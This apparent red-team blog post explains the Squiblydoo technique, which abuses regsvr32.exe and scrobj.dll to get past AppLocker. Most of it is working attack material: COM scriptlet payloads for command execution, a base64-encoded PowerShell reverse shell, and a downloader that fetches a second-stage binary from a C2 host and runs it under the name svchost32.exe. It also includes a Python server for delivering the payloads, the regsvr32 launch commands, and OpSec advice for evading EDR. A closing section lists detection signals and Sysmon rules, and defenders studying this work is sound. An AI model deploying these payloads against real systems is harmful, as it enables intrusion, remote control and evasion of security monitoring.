---
title: "AppLocker Bypass — Regsvr32 (Squiblydoo)"
date: 2026-03-06
description: "Squiblydoo: abusing regsvr32.exe and COM scriptlets to execute arbitrary JScript or VBScript remotely and locally, bypassing AppLocker default rules with a Microsoft-signed binary."
tags: ["applocker", "bypass", "regsvr32", "squiblydoo", "sct", "lolbins", "evasion", "windows", "blueteam"]
---

> **Scope:** Red team / authorized penetration testing. Technique maps to MITRE ATT&CK [T1218.010](https://attack.mitre.org/techniques/T1218/010/).

---

## Lab Setup

### Recommended VM Stack

``` {linenos=inline}
Host Machine
└── Hypervisor (VMware Workstation / VirtualBox / Hyper-V)
    ├── Windows 10/11 Enterprise (victim VM)
    │   ├── AppLocker default rules enforced (GPO)
    │   ├── Windows Defender enabled + updated
    │   ├── PowerShell 5.1
    │   ├── Sysmon (SwiftOnSecurity config)
    │   ├── Sysinternals Suite (Process Monitor, TCPView)
    │   └── Wireshark (capture SCT fetch traffic)
    │
    └── Kali Linux (attacker VM)
        ├── Python 3.10+ (HTTP server for SCT delivery)
        └── netcat / rlwrap (shell listener)
```

### Windows VM — Enable AppLocker

```powershell {linenos=inline}
# Enable AppLocker in audit + enforce mode
# Run as Administrator

# ensure Application Identity service is running (AppLocker dependency)
Set-Service -Name AppIDSvc -StartupType Automatic
Start-Service AppIDSvc

# create default rules via GPO cmdlets
$gpo = New-GPO -Name "AppLocker-Lab" -Comment "Lab AppLocker policy"

# apply default executable rules (allow %WINDIR%, %PROGRAMFILES%)
# In production: use GPMC GUI → Computer Config → Windows Settings →
#   Security Settings → Application Control Policies → AppLocker

# quick local policy via registry (for standalone lab box)
$regBase = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
@("Exe","Script","Msi","Dll","Appx") | ForEach-Object {
    $path = "$regBase\$_"
    New-Item $path -Force | Out-Null
    Set-ItemProperty $path "EnforcementMode" 1   # 1=Enforce, 0=AuditOnly
}
Write-Host "[+] AppLocker enforcement mode set"
```

```powershell {linenos=inline}
# Verify AppLocker is active — this should BLOCK execution of an untrusted binary
# Create a test exe in a non-whitelisted path and confirm it's blocked
$testPath = "$env:TEMP\test_applocker.exe"
Copy-Item "C:\Windows\System32\notepad.exe" $testPath
try {
    Start-Process $testPath -Wait -ErrorAction Stop
    Write-Warning "AppLocker NOT enforcing — check policy"
} catch {
    Write-Host "[+] AppLocker blocking — enforcement confirmed"
}
Remove-Item $testPath -Force
```

### Install Sysmon

```powershell
.\Sysmon64.exe -accepteula -i sysmon-config.xml

# verify EID 1 (process create) is firing for regsvr32
Get-WinEvent -FilterHashtable @{
    LogName="Microsoft-Windows-Sysmon/Operational"; Id=1
} -MaxEvents 5 | Select-Object TimeCreated, Message
```

### Attacker VM — Python SCT Server

```bash
# start SCT payload server on port 80
mkdir payloads
python3 serve.py &   # from this blog's serve.py

# listener for reverse shell
rlwrap nc -lvnp 4444
```

### Snapshot

```
VM → Snapshot → "REGSVR32_BASELINE"
```

---

## Execution Chain Diagram

``` {linenos=inline}
ATTACKER                          VICTIM (AppLocker enforced)
────────                          ────────────────────────────
                                  User / existing foothold
                                         │
                                         │  runs:
                                         ▼
                           regsvr32.exe /s /n /u /i:<URL> scrobj.dll
                                         │
                              ┌──────────┴──────────────┐
                              │   AppLocker evaluates   │
                              │   regsvr32.exe          │
                              │   ✓ Signed Microsoft    │
                              │   ✓ Trusted publisher   │
                              │   → ALLOW               │
                              └──────────┬──────────────┘
                                         │
                                         │  WinHTTP GET
                                         ▼
serve.py  ◄──────────────────  fetch payload.sct
   │
   │  HTTP 200  text/scriptlet
   ▼
payload.sct ─────────────────►  scrobj.dll parses SCT
                                         │
                              ┌──────────┴──────────────┐
                              │   AppLocker evaluates   │
                              │   scrobj.dll            │
                              │   ✓ Signed Microsoft    │
                              │   → ALLOW               │
                              └──────────┬──────────────┘
                                         │
                                         │  JScript / VBScript
                                         ▼
                                  <![CDATA[ ... ]]>
                                  your code executes
                                         │
nc -lvnp 4444  ◄─────────────  reverse shell connects
```

---

## AppLocker Rule Coverage Gap

``` {linenos=inline}
AppLocker Default Rules
┌─────────────────────────────────────────────────────┐
│  ✓ COVERED                   ✗ NOT COVERED          │
│  ─────────────               ────────────────────── │
│  .exe  .com                  .sct  ← this blog      │
│  .ps1  .vbs  .js             .hta                   │
│  .cmd  .bat                  .wsf  .wsc             │
│  .msi  .msp  .mst            .xsl  .inf             │
│  .dll  .ocx (off by default) .cpl  .url             │
│  .appx                       .gadget                │
│                              ...and many more       │
└─────────────────────────────────────────────────────┘

regsvr32.exe (trusted binary) loads .sct via scrobj.dll (trusted binary)
AppLocker only evaluated the binaries — never the SCT content.
```

---

## What Is AppLocker?

AppLocker is Microsoft's application whitelisting solution, available on Windows 7+ Enterprise and Ultimate SKUs. Admins define rules, by publisher, path, or file hash, that control which executables, scripts, installers, and DLLs are allowed to run.

On paper it's a solid defense. In practice, it ships with a fundamental blind spot: **signed Microsoft binaries are trusted by default**. That trust is exactly what this technique exploits.

---

## Meet Regsvr32

`regsvr32.exe` lives at `C:\Windows\System32\regsvr32.exe`. Its intended job is simple: register and unregister COM DLLs:

```cmd
regsvr32 /s shell32.dll
```

It's signed by Microsoft, it's always present, and AppLocker's default ruleset lets it run without question. What most people don't know is that it can also load **COM scriptlets**, remote or local XML files containing executable JScript or VBScript, through a completely legitimate code path that was never meant to be a security boundary.

That's the entire bypass. One trusted binary. One XML file. Game over.

The technique was named **Squiblydoo** by researcher Casey Smith ([@subTee](https://twitter.com/subTee)) and has been in the red team playbook since 2016. It still works on unpatched or misconfigured systems today.

---

## How It Works

The magic flag is `/i:` combined with `/n` (no DllInstall) and `/u` (unregister). When you pass a URL or file path to `/i:`, regsvr32 fetches and parses a COM scriptlet and executes its registration logic, which is just script code you control.

```
regsvr32 /s /n /u /i:<url_or_path> scrobj.dll
```

Breaking down the flags:

| flag | meaning |
|------|---------|
| `/s` | silent — suppress dialog boxes |
| `/n` | do not call DllRegisterServer |
| `/u` | unregister mode (still loads the scriptlet) |
| `/i:<target>` | pass `<target>` to DllInstall — accepts URLs |

`scrobj.dll` is the Windows Script Component runtime. It handles the actual parsing and execution of the scriptlet. It too is a signed Microsoft binary.

The execution chain looks like this:

``` {linenos=inline}
AppLocker policy
      │
      ▼
regsvr32.exe  ← signed, trusted, allowed
      │
      │  fetches via WinHTTP (if URL) or reads local file
      ▼
payload.sct   ← COM scriptlet, XML with embedded script
      │
      ▼
scrobj.dll    ← signed, trusted, parses and executes script
      │
      ▼
JScript / VBScript runs with user privileges
```

AppLocker never gets a chance to evaluate the scriptlet itself. It only sees trusted binaries on both ends.

---

## The Scriptlet Format

COM scriptlets are XML files with a `.sct` extension. The structure is straightforward:

```xml {linenos=inline}
<?XML version="1.0"?>
<scriptlet>
  <registration
    progid="AnyStringHere"
    classid="{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}">
    <script language="JScript">
      <![CDATA[
        // your code runs here
      ]]>
    </script>
  </registration>
</scriptlet>
```

- `progid` — arbitrary string, doesn't matter
- `classid` — any valid GUID format, doesn't need to be registered
- `language` — `JScript` or `VBScript`
- The `<![CDATA[...]]>` block is your payload

---

## Custom Payloads

### 1. Proof of Concept — calculator pop

The classic "I'm in" confirmation. Pops calc.exe, no network activity, no persistence, clean PoC for client demos.

```xml {linenos=inline}
<?XML version="1.0"?>
<scriptlet>
  <registration
    progid="ShellExec"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
    <script language="JScript">
      <![CDATA[
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("calc.exe", 0, false);
      ]]>
    </script>
  </registration>
</scriptlet>
```

---

### 2. Command execution — arbitrary cmd

Run any command silently. Swap out the command string for whatever your engagement calls for.

```xml {linenos=inline}
<?XML version="1.0"?>
<scriptlet>
  <registration
    progid="CmdExec"
    classid="{F0001111-0000-0000-0000-0000FEEDACDD}">
    <script language="JScript">
      <![CDATA[
        var shell = new ActiveXObject("WScript.Shell");
        var cmd   = "cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt";
        shell.Run(cmd, 0, true);
      ]]>
    </script>
  </registration>
</scriptlet>
```

---

### 3. Reverse shell — PowerShell one-liner delivery

This is the one you'll actually use on engagements. The scriptlet invokes PowerShell with a base64-encoded reverse shell, window hidden, execution policy bypassed. Swap in your IP and port.

```xml {linenos=inline}
<?XML version="1.0"?>
<scriptlet>
  <registration
    progid="RevShell"
    classid="{F0001111-0000-0000-0000-0000FEEDACDE}">
    <script language="JScript">
      <![CDATA[
        var shell = new ActiveXObject("WScript.Shell");

        // PowerShell reverse shell — update LHOST and LPORT
        var LHOST = "10.10.10.10";
        var LPORT = "4444";

        var ps = "$c=New-Object Net.Sockets.TCPClient('" + LHOST + "'," + LPORT + ");" +
                 "$s=$c.GetStream();" +
                 "[byte[]]$b=0..65535|%{0};" +
                 "while(($i=$s.Read($b,0,$b.Length))-ne 0){" +
                 "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);" +
                 "$r=(iex $d 2>&1|Out-String);" +
                 "$rb=[Text.Encoding]::ASCII.GetBytes($r+' PS '+((gl).Path)+'> ');" +
                 "$s.Write($rb,0,$rb.Length);" +
                 "$s.Flush()};" +
                 "$c.Close()";

        // base64 encode for -EncodedCommand
        var encoded = "";
        for (var i = 0; i < ps.length; i++) {
            encoded += String.fromCharCode(ps.charCodeAt(i), 0);
        }
        var b64 = btoa(encoded);

        var cmd = "powershell.exe -nop -w hidden -ep bypass -EncodedCommand " + b64;
        shell.Run(cmd, 0, false);
      ]]>
    </script>
  </registration>
</scriptlet>
```

> `btoa()` is available in JScript on Windows 8+. On older targets replace it with a manual base64 encoder or drop the encoding entirely and just pass the raw command and adjust OpSec vs compatibility as needed.

---

### 4. Shellcode loader via scriptlet

If you're dropping raw shellcode (e.g. a Cobalt Strike or Sliver stager), the scriptlet can call into a VBScript helper that writes a temporary HTA or drops a loader. Alternatively, chain into your `modern_runner` binary via a staged download:

```xml {linenos=inline}
<?XML version="1.0"?>
<scriptlet>
  <registration
    progid="StagerDrop"
    classid="{F0001111-0000-0000-0000-0000FEEDACDF}">
    <script language="JScript">
      <![CDATA[
        var xhr   = new ActiveXObject("MSXML2.XMLHTTP");
        var shell = new ActiveXObject("WScript.Shell");
        var fso   = new ActiveXObject("Scripting.FileSystemObject");

        // pull second stage binary from C2
        var url  = "http://10.10.10.10:8080/stage2.exe";
        var drop = shell.ExpandEnvironmentStrings("%TEMP%") + "\\svchost32.exe";

        xhr.open("GET", url, false);
        xhr.send();

        if (xhr.status === 200) {
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Type = 1; // binary
            stream.Open();
            stream.Write(xhr.responseBody);
            stream.SaveToFile(drop, 2);
            stream.Close();
            shell.Run(drop, 0, false);
        }
      ]]>
    </script>
  </registration>
</scriptlet>
```

---

## Hosting the Scriptlet

For remote delivery you need an HTTP server that serves the `.sct` file. Anything works. Here's a minimal Python server that sets the right content type so scrobj.dll doesn't reject it:

```python {linenos=inline}
#!/usr/bin/env python3
# serve.py — minimal SCT host for Squiblydoo delivery

from http.server import HTTPServer, BaseHTTPRequestHandler
import os

PAYLOAD_DIR = "./payloads"   # put your .sct files here
PORT        = 80

class SCTHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = os.path.join(PAYLOAD_DIR, self.path.lstrip("/"))
        if not os.path.isfile(path):
            self.send_response(404)
            self.end_headers()
            return

        with open(path, "rb") as f:
            data = f.read()

        self.send_response(200)
        self.send_header("Content-Type", "text/scriptlet")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, fmt, *args):
        print(f"[{self.client_address[0]}] {fmt % args}")

if __name__ == "__main__":
    os.makedirs(PAYLOAD_DIR, exist_ok=True)
    print(f"[*] serving {PAYLOAD_DIR}/ on :{PORT}")
    HTTPServer(("0.0.0.0", PORT), SCTHandler).serve_forever()
```

```bash
# layout
payloads/
  calc.sct
  revshell.sct
  stage.sct

python3 serve.py
```

---

## Execution

### Remote (most common — no file drops)

```cmd
regsvr32 /s /n /u /i:http://10.10.10.10/revshell.sct scrobj.dll
```

No file touches disk except the regsvr32 process itself. The scriptlet is fetched entirely in memory via WinHTTP.

### Local file

```cmd
regsvr32 /s /n /u /i:C:\Users\Public\payload.sct scrobj.dll
```

### UNC path (internal network share)

```cmd
regsvr32 /s /n /u /i:\\fileserver\share\payload.sct scrobj.dll
```

### HTTPS

Works natively. Regsvr32 uses WinHTTP which respects the system proxy and trusts the system certificate store, useful when the target environment blocks plain HTTP egress.

```cmd
regsvr32 /s /n /u /i:https://your.c2.domain/payload.sct scrobj.dll
```

---

## OpSec Notes

- The process tree is `regsvr32.exe → (scrobj.dll parses scriptlet)`. If your scriptlet spawns `powershell.exe` or `cmd.exe`, those appear as children of regsvr32, a moderately loud signal. Consider spawning via `WScript.Shell.Run` with window hidden (`0`) and not waiting for completion (`false`).
- HTTPS delivery hides the payload URL from network inspection but the TLS SNI is still visible without a domain-fronting setup.
- Defender / EDR products with script content inspection will still see the JScript source. If you need extra cover, encode the actual logic or proxy it through a legitimate-looking scriptlet that loads a second stage.
- `regsvr32.exe` spawning network connections is itself a detection opportunity: see below.

---

## Detection (Blue Team)

If you're defending against this:

| signal | where to look |
|--------|--------------|
| `regsvr32.exe` making outbound HTTP/S | network telemetry, Windows Firewall logs |
| `regsvr32.exe` spawning `cmd.exe`, `powershell.exe`, `wscript.exe` | Sysmon Event ID 1 (process create), parent image |
| `/i:` flag containing a URL in command line | Sysmon Event ID 1, process command line |
| `scrobj.dll` loaded by non-standard process | Sysmon Event ID 7 (image load) |
| AppLocker audit logs showing regsvr32 executing scriptlets | AppLocker event log, Event ID 8004 |

**Sysmon rule (rules.xml snippet):**
```xml
<ProcessCreate onmatch="include">
  <ParentImage condition="is">C:\Windows\System32\regsvr32.exe</ParentImage>
</ProcessCreate>

<ProcessCreate onmatch="include">
  <CommandLine condition="contains">/i:http</CommandLine>
  <Image condition="is">C:\Windows\System32\regsvr32.exe</Image>
</ProcessCreate>
```

**Mitigation:** Software Restriction Policies or AppLocker rules that explicitly block `regsvr32.exe` from making outbound network connections, combined with blocking child process spawning from regsvr32. Windows Defender Application Control (WDAC) is more robust than AppLocker for this. It operates at the kernel level and is harder to bypass.

---

## MITRE ATT&CK

| field | value |
|-------|-------|
| Tactic | Defense Evasion |
| Technique | T1218 — System Binary Proxy Execution |
| Sub-technique | T1218.010 — Regsvr32 |
| Platforms | Windows |
| Permissions Required | User |
| Supports Remote | Yes |

---

## References

- [MITRE ATT&CK T1218.010](https://attack.mitre.org/techniques/T1218/010/)
- Casey Smith — original Squiblydoo research (2016)
- [Red Canary — Regsvr32 abuse detection](https://redcanary.com)
- [LOLBAS Project — regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)
